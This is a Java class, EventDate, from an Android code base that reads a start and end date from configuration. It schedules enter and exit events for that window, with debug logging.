package com.android.service.event;

import java.text.DateFormat;
import java.text.ParseException;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.TimeZone;

import com.android.service.Exit;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfEvent;
import com.android.service.conf.ConfigurationException;
import com.android.service.util.Check;

public class EventDate extends BaseTimer {
	private static final String TAG = "EventDate";
	
	private Date dateFrom;
	private Date dateTo;
	
	Calendar start;
	Calendar stop;

	private boolean nextDailyIn;

	@Override
	protected boolean parse(ConfEvent event) {
		try {
			String dateFromString=conf.getString("datefrom");
			String dateToString=conf.getString("dateto");
			
			dateFrom = DateFormat.getDateInstance().parse(dateFromString);
			dateTo = DateFormat.getDateInstance().parse(dateToString);
			
		} catch (ConfigurationException e) {
			return false;
		} catch (ParseException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) Error: " + e);
			}
			return false;
		}
		return true;
	}

	@Override
	public void actualStart() {		
		
		start = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));
		start.setTime(dateFrom);
		stop = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));
		stop.setTime(dateTo);
		
		Calendar now = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));

		if(now.before(start)){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart): not yet in the brackets");
			}
			setDailyDelay();
		}else if(now.before(stop)){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart): already in the brackets");
			}
			onEnter();
			setDailyDelay();
		}else{
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart): nothing to do");
			}
		}
	}
	
	private boolean setDailyDelay() {			
		Calendar now = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));

		if(now.before(start)){
			setPeriod((start.getTimeInMillis() - now.getTimeInMillis())/1000);
			return true;
		}else if(now.before(stop)){
			setPeriod((stop.getTimeInMillis() - now.getTimeInMillis())/1000);		
			return false;
		}else{
			this.onExit();
			setPeriod(NEVER);
			return false;
		}

	}


	@Override
	public void actualGo() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " Info: " + "triggering");//$NON-NLS-1$ //$NON-NLS-2$
		}

		if (nextDailyIn) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): DAILY TIMER: action enter"); //$NON-NLS-1$
			}
			onEnter();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): DAILY TIMER: action exit"); //$NON-NLS-1$
			}
			onExit();
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (go): daily IN BEFORE: " + nextDailyIn); //$NON-NLS-1$
		}
		nextDailyIn = setDailyDelay();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (go): daily IN AFTER: " + nextDailyIn); //$NON-NLS-1$
		}

	}

	@Override
	public void actualStop() {
		onExit(); // di sicurezza
	}

}
